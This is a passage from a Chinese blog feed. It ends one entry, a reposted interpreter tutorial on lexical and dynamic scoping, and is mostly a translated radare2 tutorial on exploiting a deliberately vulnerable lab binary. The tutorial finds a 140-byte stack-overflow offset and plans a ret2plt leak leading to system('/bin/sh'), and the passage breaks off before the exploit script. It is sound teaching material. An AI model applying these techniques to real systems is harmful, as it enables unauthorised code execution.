class="line">)))</span><br></pre></td></tr></table></figure><p>注意到这个解释器的函数有多容易实现吗？它就是这个函数的表达式自己，原封不动。用函数的表达式本身来表示它的值，是很直接很简单的做法，也是大部分人一开头就会想到的。然而这样实现出来的语言，就不知不觉地采用了 dynamic scoping。</p><p>这就是为什么很多早期的 Lisp 语言，比如 Emacs Lisp，都使用 dynamic scoping。这并不是因为它们的设计者在 dynamic scoping 和 lexical scoping 两者之中做出了选择，而是因为使用函数的表达式本身来作为它的值，是最直接，一般人都会首先想到的做法。</p><p>另外，在这里我们也看到环境用“函数式数据结构”表示的好处。闭包被调用时它的环境被扩展，但是这并不会影响原来的那个环境，我们得到的是一个新的环境。所以当函数调用返回之后，函数的参数绑定就自动“注销”了。</p><p>如果你用一个非函数式的数据结构，在绑定参数时不生成新的环境，而是对已有环境进行赋值，那么这个赋值操作就会永久性的改变原来环境的内容。所以你在函数返回之后必须删除参数的绑定。这样不但麻烦，而且在复杂的情况下很容易出错。</p><p><strong>思考题</strong>：可能有些人看过 lambda calculus，这些人可能知道 (let ([x e1]) e2) 其实等价于一个函数调用：((lambda (x) e2) e1)。现在问题来了，我们在讨论函数和调用的时候，很深入的讨论了关于 lexical scoping 和 dynamic scoping 的差别。既然 let 绑定等价于一个函数定义和调用，为什么之前我们讨论对绑定的时候，没有讨论过 lexical scoping 和 dynamic scoping 的问题，也没有制造过闭包呢？</p><h2 id="不足之处"><a href="#不足之处" class="headerlink" title="不足之处"></a>不足之处</h2><p>现在你已经学会了如何写出一个简单的解释器，它可以处理一个相当强大的函数式语言。出于教学的考虑，这个解释器并没有考虑实用的需求，所以它并不能作为工业应用。在这里，我指出它的一些不足之处。</p><ol><li><p>缺少必要的语言构造。我们的语言里缺少好些实用语言必须的构造：递归，数组，赋值操作，字符串，自定义数据结构，…… 作为一篇基础性的读物，我不能把这些都加进来。如果你对这些有兴趣，可以看看其它书籍，或者等待我的后续作品。</p></li><li><p>不合法代码的检测和报告。你也许发现了，这个解释器的 match 表达式，全都假定了输入都是合法的程序，它并没有检查不合法的情况。如果你给它一个不合法的程序，它不会马上报错，而是会真去算它，以至于导致奇怪的后果。一个实用的解释器，必须加入对代码格式进行全面检测，在运行之前就报告不合法的代码结构。</p></li><li><p>低效率的数据结构。在 association list 里面查找变量，是线性的复杂度。当程序有很多变量的时候就有性能问题。一个实用的解释器，需要更高效的数据结构。这种数据结构不一定非得是函数式的。你也可以用非函数式的数据结构（比如哈希表），经过一定的改造，达到同样的性质，却具有更高的效率。 ​ 另外，你还可以把环境转化成一个数组。给环境里的每个变量分配一个下标（index），在这个数组里就可以找到它的值。如果你用数组表示环境，那么这个解释器就向编译器迈进了一步。</p></li><li><p>S 表达式的歧义问题。为了教学需要，我们的解释器直接使用 S 表达式来表达语法树，用模式匹配来进行分支遍历。在实际的语言里，这种方式会带来比较大的问题。因为 S 表达式是一种通用的数据结构，用它表示的东西，看起来都差不多的样子。一旦程序的语法构造多起来，直接对 S 表达式进行模式匹配，会造成歧义。 ​</p></li></ol><p>比如 (,op ,e1 ,e2) ，你以为它只匹配二元算术操作，比如 (+ 1 2)。但它其实也可以匹配一个 let 绑定： (let ([x 1]) (* x 2))。这是因为它们顶层元素的数目是一样的。为了消除歧义，你得小心的安排模式的顺序，比如你必须把 (let ([,x ,e1]) ,e2) 的模式放在 (,op ,e1, e2) 前面。所以最好的办法，是不要直接在 S 表达式上写解释器，而是先写一个“parser”，这个 parser 把 S 表达式转换成 Racket 的 struct 结构。然后解释器再在 struct 上面进行分支匹配。这样解释器不用担心歧义问题，而且会带来效率的提升。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;转自&lt;a href=&quot;http://www.yinwang.org/blog-cn/2012/08/01/interpreter&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;王垠老师的博客&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>【译】Radare2之旅-Part2：Exploitation</title>
    <link href="https://qianfei11.github.io/2019/02/23/%E3%80%90%E8%AF%91%E3%80%91Radare2%E4%B9%8B%E6%97%85-Part2%EF%BC%9AExploitation/"/>
    <id>https://qianfei11.github.io/2019/02/23/【译】Radare2之旅-Part2：Exploitation/</id>
    <published>2019-02-23T03:18:10.000Z</published>
    <updated>2019-02-28T05:32:09.034Z</updated>
    
    <content type="html"><![CDATA[<p>翻译自<a href="https://www.megabeets.net/a-journey-into-radare-2-part-2/" target="_blank" rel="noopener">Megabeets</a>。</p><a id="more"></a><h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>欢迎来到我们<code>radare2</code>之旅的第二部分！在这一部分，我们会涵盖<code>radare2</code>的更多部分，同时这次更注重于二进制漏洞挖掘。</p><p>相信大家都一定很期待这第二部分，之后的内容也一定会更快地分享给大家。如果你还没有阅读过这一系列的<a href="https://www.megabeets.net/a-journey-into-radare-2-part-1/" target="_blank" rel="noopener">第一部分</a>，我非常推荐你去读一读。第一部分记录了<code>radare2</code>的基础内容，同时也解释了很多我今天会用到的命令。</p><p>在这一部分，我们的目的是对一个简单的程序进行漏洞挖掘与利用。<code>radare2</code>有很多不同的功能可以帮我们对漏洞进行利用，例如保护技术、查找ROP、生成随机序列、查看寄存器内容等等。你可以在本文末尾找到一份命令对应表。今天我会向你们展示这些强大的功能，同时我们用<code>radare2</code>来绕过在开启<code>ASLR</code>的系统上运行并且有<code>NX</code>保护的程序。我假设大家都已经掌握了以下的预备知识：</p><ul><li>汇编语言</li><li>程序保护技术（<code>NX</code>、<code>ASLR</code>）</li><li><a href="https://en.wikipedia.org/wiki/Call_stack" target="_blank" rel="noopener">栈帧结构</a></li><li><a href="https://en.wikipedia.org/wiki/Buffer_overflow" target="_blank" rel="noopener">缓冲区溢出</a></li><li><a href="https://en.wikipedia.org/wiki/Return-oriented_programming" target="_blank" rel="noopener">面向返回编程</a></li><li><a href="https://en.wikipedia.org/wiki/X86_calling_conventions" target="_blank" rel="noopener">x86调用约定</a></li></ul><p>熟悉这些知识是很重要的一步，因为文章中我并不会细讲，甚至不会对其解释。</p><p><img src="https://www.megabeets.net/uploads/r2_part1_2.png" alt></p><h1 id="更新radare2"><a href="#更新radare2" class="headerlink" title="更新radare2"></a>更新<code>radare2</code></h1><p>首先，我们将<code>radare2</code>更新至其git的最新版版：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> git clone https://github.com/radare/radare2.git # 如果你还没有克隆下来的话</span><br><span class="line"><span class="meta">$</span> cd radare2</span><br><span class="line"><span class="meta">$</span> ./sys/install.sh</span><br></pre></td></tr></table></figure><p>等待更新完成需要很长一段时间，在这期间不如看些视频放松一会儿。</p><h1 id="熟悉程序"><a href="#熟悉程序" class="headerlink" title="熟悉程序"></a>熟悉程序</h1><p>你可以在这里下载<a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%202%20-%20Exploitation/megabeets_0x2" target="_blank" rel="noopener">程序</a>，在这里下载<a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%202%20-%20Exploitation/megabeets_0x2.c" target="_blank" rel="noopener">源码</a>。<br>如果你想自己编译程序，用以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> gcc -m32  -fno-stack-protector megabeets_0x2.c -o megabeets_0x2</span><br></pre></td></tr></table></figure><p>这次的程序与上一次的程序非常相似，只是在<code>main()</code>函数中有一些细微的改变：</p><ul><li>编译时不使用参数<code>-z execstac</code>来开启<code>NX</code></li><li>通过scanf来接收用户的输入，而不是通过程序的参数</li><li>大部分输出的函数为puts</li><li>对程序的输出做了一点修改</li></ul><p>这是之前的<code>main()</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n  .:: Megabeets ::.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Think you can make it?\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> (argc &gt;= <span class="number">2</span> &amp;&amp; beet(argv[<span class="number">1</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Success!\n\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Nop, Wrong argument.\n\n"</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后现在的<code>main</code>函数是这样的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *input; </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\n  .:: Megabeets ::.\n"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Show me what you got:"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%ms"</span>, &amp;input);</span><br><span class="line">    <span class="keyword">if</span> (beet(input))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Success!\n\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Nop, Wrong argument.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序的功能十分简单，并且在前一篇文章中我们已经对它很熟悉了——要求输入字符串，与经过<code>rot13</code>加密的字符串<code>Megabeets</code>比较。故输入应该为<code>Zrtnorrgf</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ./megabeets_0x2 </span><br><span class="line"></span><br><span class="line">  .:: Megabeets ::.</span><br><span class="line"></span><br><span class="line">Show me what you got:</span><br><span class="line">blablablabla</span><br><span class="line">Nop, Wrong argument.</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span> ./megabeets_0x2 </span><br><span class="line"></span><br><span class="line">  .:: Megabeets ::.</span><br><span class="line"></span><br><span class="line">Show me what you got:</span><br><span class="line">Zrtnorrgf</span><br><span class="line">Success!</span><br></pre></td></tr></table></figure><p>这些都很简单，但是我们今天的重点并不是破解一个简单的crackme，而是对其进行漏洞利用。那我们开始吧！</p><h1 id="理解漏洞"><a href="#理解漏洞" class="headerlink" title="理解漏洞"></a>理解漏洞</h1><p>对于每一个PWN题给出的程序来说，检查程序开了什么保护是一个好习惯。我们可以使用上一篇文章中提到的<code>rabin2</code>，或者直接在<code>radare2</code>的shell里执行<code>i</code>命令。因为我们还没有用<code>radare2</code>打开文件，就先用<code>rabin2</code>来看看：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> rabin2 -I megabeets_0x2</span><br><span class="line"> </span><br><span class="line">arch     x86</span><br><span class="line">binsz    6072</span><br><span class="line">bintype  elf</span><br><span class="line">bits     32</span><br><span class="line">canary   false</span><br><span class="line">class    ELF32</span><br><span class="line">crypto   false</span><br><span class="line">endian   little</span><br><span class="line">havecode true</span><br><span class="line">intrp    /lib/ld-linux.so.2</span><br><span class="line">lang     c</span><br><span class="line">linenum  true</span><br><span class="line">lsyms    true</span><br><span class="line">machine  Intel 80386</span><br><span class="line">maxopsz  16</span><br><span class="line">minopsz  1</span><br><span class="line">nx       true</span><br><span class="line">os       linux</span><br><span class="line">pcalign  0</span><br><span class="line">pic      false</span><br><span class="line">relocs   true</span><br><span class="line">relro    partial</span><br><span class="line">rpath    NONE</span><br><span class="line">static   false</span><br><span class="line">stripped false</span><br><span class="line">subsys   linux</span><br><span class="line">va       true</span><br></pre></td></tr></table></figure><p>在标记的几行中，我们可以看到程序开了<code>NX</code>，也就是说栈是不可执行的。还有，该程序没有开启<a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries" target="_blank" rel="noopener"><code>Canary</code></a>、<a href="https://en.wikipedia.org/wiki/Position-independent_code" target="_blank" rel="noopener"><code>PIC</code></a>或是<a href="https://tk-blog.blogspot.co.il/2009/02/relro-not-so-well-known-memory.html" target="_blank" rel="noopener"><code>RELRO</code></a>。</p><p>现在我们迅速地过一遍程序的执行流，这次我们看一看它的反汇编代码（并不是每次漏洞挖掘都能有源码）。使用<code>radare2</code>的调试模式打开程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> r2 -d megabeets_0x2</span><br><span class="line">Process with PID 20859 started…</span><br><span class="line">= attach 20859 20859</span><br><span class="line">bin.baddr 0x08048000</span><br><span class="line">Using 0x8048000</span><br><span class="line">Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2</span><br><span class="line">asm.bits 32– Your endian swaps</span><br><span class="line"><span class="meta">[0xf7782b30]&gt;</span> aas</span><br></pre></td></tr></table></figure><blockquote><ul><li><code>-d</code>  – 用调试模式打开</li><li><code>aas</code> – 分析函数、符号以及其他</li><li>注意：正如我在前一篇文章所提到的，开始时使用<code>aaa</code>分析是最推荐的方式，因为分析本来就是一个很复杂的过程。我在<a href="https://reverseengineering.stackexchange.com/a/16115/18698" target="_blank" rel="noopener">这篇回答</a>里写了更多——读一下也许会让你的理解更深。</li></ul></blockquote><p>现在我们继续执行程序，直到<code>main</code>函数。只要输入命令<code>dcu main</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0xf7797b30]&gt;</span> dcu?</span><br><span class="line">|Usage: dcu Continue until address</span><br><span class="line">| dcu address      Continue until address</span><br><span class="line">| dcu [..tail]     Continue until the range</span><br><span class="line">| dcu [from] [to]  Continue until the range</span><br><span class="line"><span class="meta">[0xf7797b30]&gt;</span> dcu main</span><br><span class="line">Continue until 0x08048658 using 1 bpsize</span><br><span class="line">hit breakpoint at: 8048658</span><br></pre></td></tr></table></figure><blockquote><ul><li><code>dcu</code>代表<code>debug continue until</code></li></ul></blockquote><p>现在让我们输入<code>VV</code>进入图形模式。在第一部分解释过，你可以通过<code>p</code>和<code>P</code>切换视角，通过<code>k</code>/<code>j</code>/<code>h</code>/<code>l</code>分别向上/下/左/右移动，通过<code>g</code>和调用旁的字母跳转函数（例如<code>gd</code>）。</p><p>用<code>?</code>来列出所有在图形模式下的命令，同时别忘记<code>R</code>命令😉</p><p><img src="https://www.megabeets.net/uploads/mainsym.png" alt></p><p><code>main()</code>函数是程序要求我们输入的地方，并且它将输入传给<code>sym.beet</code>。通过<code>gc</code>我们跳转到处理我们输入的<code>beet()</code>函数：</p><p><img src="https://www.megabeets.net/uploads/beetsym.png" alt></p><p>我们可以看到用户的输入<code>[arg_8h]</code>被复制给一个缓冲区（<code>[local_88h]</code>），然后就是我们在前一篇文章中所看到过的，字符串<code>Megabeets</code>用<code>rot13</code>加密了，所得结果与我们的输入做比较。我们之前了解过，我这里就不做深究。</p><p>你有看到什么可以的地方吗？我们的输入没有对长度做检查，然后直接复制到了缓冲区中。这意味着如果我们输入一串超过缓冲区大小的字符串，就能导致栈上的缓冲区溢出。至此，我们找到了漏洞。</p><h1 id="规划漏洞利用脚本"><a href="#规划漏洞利用脚本" class="headerlink" title="规划漏洞利用脚本"></a>规划漏洞利用脚本</h1><p>既然我们已经找到了有漏洞的函数，我们需要构造一个payload来利用它。我们的目标很明了，就是在系统上成功开一个shell。首先，我们要确认确实有一个有漏洞的函数，然后我们需要找到一个我们的payload可以覆盖栈的偏移。</p><p><img src="https://www.megabeets.net/uploads/tumblr_m5vxpy8Cs41qfoh4t.gif" alt></p><p>我们将会使用一个<code>radare2</code>框架中的工具，叫做<code>ragg2</code>。它能够为我们生成一段循环的<a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence" target="_blank" rel="noopener">德布鲁因序列</a>，用来检测覆盖缓冲区的确切的偏移大小。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ragg2 -</span><br><span class="line">&lt;truncated&gt;</span><br><span class="line"> -P [size]       prepend debruijn pattern</span><br><span class="line">&lt;truncated&gt;</span><br><span class="line"> -r              show raw bytes instead of hexpairs</span><br><span class="line">&lt;truncated&gt;</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span> ragg2 -P 100 -r</span><br><span class="line">AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh</span><br></pre></td></tr></table></figure><p>我们知道我们的程序通过输入流读取我们的输入，而不是从shell中读取我们的输入。故我们将会使用又一个来自<code>radare2</code>工具箱中的工具，<code>rarun2</code>。</p><blockquote><ul><li><p><code>rarun2</code>可以在不同环境、参数、执行权限、文件夹下运行程序，并且覆盖默认的文件描述符（例如<code>stdin</code>）</p></li><li><p>如果你需要在跑一个程序时使用很长的参数，它会起很大的作用。而且漏洞利用通常都会向输入流传一大堆数据。</p></li></ul></blockquote><p>我们需要做以下的三个步骤：</p><ul><li>使用<code>ragg2</code>将德布鲁因序列写入一个文件</li><li>新建一个<code>rarun2</code>配置文件，并且把前一个文件作为<code>stdin</code></li><li>让<code>radare2</code>来找到偏移</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ragg2 -P 200 -r &gt; pattern.txt</span><br><span class="line"><span class="meta">$</span> cat pattern.txt</span><br><span class="line">AAABAACAADAAEAAFAAGAAHAAI… &lt;truncated&gt; …7AA8AA9AA0ABBABCABDABEABFA</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span> vim profile.rr2</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span> cat profile.rr2</span><br><span class="line"><span class="meta">#</span>!/usr/bin/rarun2</span><br><span class="line">stdin=./pattern.txt</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span> r2 -r profile.rr2 -d megabeets_0x2</span><br><span class="line">Process with PID 21663 started…</span><br><span class="line">= attach 21663 21663</span><br><span class="line">bin.baddr 0x08048000</span><br><span class="line">Using 0x8048000</span><br><span class="line">Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2</span><br><span class="line">asm.bits 32</span><br><span class="line"> </span><br><span class="line">— Use rarun2 to launch your programs with a predefined environment.</span><br><span class="line"><span class="meta">[0xf77c2b30]&gt;</span> dc</span><br><span class="line">Selecting and continuing: 21663</span><br><span class="line"> </span><br><span class="line">.:: Megabeets ::.</span><br><span class="line"> </span><br><span class="line">Show me what you got?</span><br><span class="line">child stopped with signal 11</span><br><span class="line"> </span><br><span class="line"><span class="meta">[0x41417641]&gt;</span></span><br></pre></td></tr></table></figure><p>我们运行程序，并将<em>pattern.txt</em>的内容用<code>rarun2</code>传给<code>stdin</code>，<em>SIGSEV 11</em>。</p><blockquote><ul><li><p>一个信号是一种发送给进程或是一个具体线程的异步通知，这样与之相同的进程就会在某个事件发生时得到提醒。</p></li><li><p>SIGSEGV（11）信号在访问了某个无效的虚拟内存或段错误后会触发。</p></li></ul></blockquote><p>你发现了吗？我们实时的指针现在指向了<code>0x41417641</code>。这是一个无效的地址，它表示了字符串<code>AvAA</code>（小端序及ascii码转换），也就是我们送的字符串的一部分。<code>radare2</code>允许我们找到给出的值在德布鲁因序列中的偏移。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x41417641]&gt;</span> wop?</span><br><span class="line">|Usage: wop[DO] len @ addr | value</span><br><span class="line">| wopD len [@ addr]  Write a De Bruijn Pattern of length ‘len’ at address ‘addr’</span><br><span class="line">| wopO value         Finds the given value into a De Bruijn Pattern at current offset</span><br><span class="line"><span class="meta">[0x41417641]&gt;</span> wopO `dr eip`</span><br><span class="line">140</span><br></pre></td></tr></table></figure><p>既然我们已经知道需要覆盖返回地址的偏移为140，我们可以开始编写脚本了。</p><h1 id="编写漏洞利用脚本"><a href="#编写漏洞利用脚本" class="headerlink" title="编写漏洞利用脚本"></a>编写漏洞利用脚本</h1><p>我之前也提到过很多次，这篇文章不是教一些漏洞利用的基础知识的，它的目的是展示<code>radare2</code>在漏洞利用中是如何使用的。因此，我不会过多地解释脚本的每个部分。</p><p>我们的目标是在系统中产生一个shell。这有很多种方法，尤其是这样一个程序。为了知道我们能做什么，首先我们需要知道我们不能做什么。我们的程序在开了<code>ASLR</code>地环境下，所以我们不能猜测到<a href="https://en.wikipedia.org/wiki/C_standard_library" target="_blank" rel="noopener"><em>libc</em></a>在内存中的地址。那就可以和<a href="https://en.wikipedia.org/wiki/Return-to-libc_attack" target="_blank" rel="noopener"><em>ret2libc</em></a>说再见了。另外，程序开了<code>NX</code>，这意味栈是不可执行的，所以我们不能直接在栈上放一个<a href="https://en.wikipedia.org/wiki/Shellcode" target="_blank" rel="noopener"><em>shellcode</em></a>然后跳过去。</p><p>虽然这些保护让我们不能使用一些漏洞利用技术，然而这不能阻止我们轻松地绕过它们。编写我们的脚本时，需要细心地观察提供给我们的运行库以及函数。</p><p>让我们再次通过调试模式打开程序，然后看一看它使用的运行库和函数。先看库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">$</span> r2 -d megabeets_0x2</span><br><span class="line">Process with PID 23072 started…</span><br><span class="line">= attach 23072 23072</span><br><span class="line">bin.baddr 0x08048000</span><br><span class="line">Using 0x8048000</span><br><span class="line">Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2</span><br><span class="line">asm.bits 32</span><br><span class="line">— You haxor! Me jane?</span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span> il</span><br><span class="line">[Linked libraries]</span><br><span class="line">libc.so.61 library</span><br></pre></td></tr></table></figure><p><code>il</code>表示<code>Information libraries</code>，即告诉我们程序所使用的运行库。对于该程序来说，只有我们最爱的<em>libc</em>。</p><p>现在通过执行<code>ii</code>命令——<code>Information Imports</code>，让我们看看导入的函数。我们可以加上<code>q</code>来减少冗长的输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0xf7763b30]&gt;</span> ii</span><br><span class="line">[Imports]</span><br><span class="line">ordinal=001 plt=0x08048370 bind=GLOBAL type=FUNC name=strcmp</span><br><span class="line">ordinal=002 plt=0x08048380 bind=GLOBAL type=FUNC name=strcpy</span><br><span class="line">ordinal=003 plt=0x08048390 bind=GLOBAL type=FUNC name=puts</span><br><span class="line">ordinal=004 plt=0x00000000 bind=WEAK type=NOTYPE name=__gmon_start__</span><br><span class="line">ordinal=005 plt=0x080483a0 bind=GLOBAL type=FUNC name=__libc_start_main</span><br><span class="line">ordinal=006 plt=0x080483b0 bind=GLOBAL type=FUNC name=__isoc99_scanf6 imports</span><br><span class="line"></span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span> iiq</span><br><span class="line">strcmp</span><br><span class="line">strcpy</span><br><span class="line">puts</span><br><span class="line">__gmon_start__</span><br><span class="line">__libc_start_main</span><br><span class="line">__isoc99_scanf</span><br></pre></td></tr></table></figure><h2 id="计划"><a href="#计划" class="headerlink" title="计划"></a>计划</h2><ul><li>泄漏<code>puts</code>的真实地址</li><li>计算<em>libc</em>的基址</li><li>计算<code>system</code>的地址</li><li>在<em>libc</em>中找到包含字符串<code>/bin/sh</code>的地址</li><li>调用<code>system(&quot;/bin/sh&quot;)</code>打开一个shell</li></ul><h2 id="泄漏puts的地址"><a href="#泄漏puts的地址" class="headerlink" title="泄漏puts的地址"></a>泄漏<code>puts</code>的地址</h2><p>我们需要用到<code>ret2plt</code>来泄漏<code>puts</code>的真实地址。<code>PLT</code>（<em>Procedure Linkage Table</em>）是内存中的结构体，它包括一小段代码，能够跳转到在动态链接时程序之外的函数地址。不管什么时候，我们在<code>.text</code>段看到<code>CALL</code>指令，并不是直接跳到函数。实际上，它跳转到了<code>PLT</code>中的一小段代码，像是<code>func_name@plt</code>这样。这一小段代码跳转到<code>GOT</code>（<em>Global Offset Table</em>）中的列出的该函数的地址。<code>GOT</code>表入口点会指回<code>PLT</code>，同时<code>PLT</code>会调用一个动态链接器来确定该函数的真实地址。下一次调用<code>func_name@plt</code>时，这段代码会直接跳转到<code>GOT</code>表里的函数地址。想要了解更多关于动态链接的知识，我推荐伊恩兰斯泰勒写的<a href="https://www.airs.com/blog/archives/38" target="_blank" rel="noopener">这一系列关于链接器的文章</a></p><p>为了达到这个目的，我们需要找到<code>puts</code>在<code>PLT</code>以及<code>GOT</code>中的地址，然后调用<code>puts@plt</code>并且把<code>puts@got</code>作为参数。我们将把这些调用连在一起，在<code>scanf</code>时传给程序。然后我们会返回到我们利用的第二个阶段。<code>puts</code>将会把它真实的地址输出出来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+---------------------+</span><br><span class="line">|       Stage 1       |</span><br><span class="line">+---------------------+</span><br><span class="line">| padding (140 bytes) |</span><br><span class="line">| puts@plt            |</span><br><span class="line">| entry_point         |</span><br><span class="line">| puts@got            |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure><p>编写脚本我们需要使用<a href="https://github.com/Gallopsled/pwntools" target="_blank" 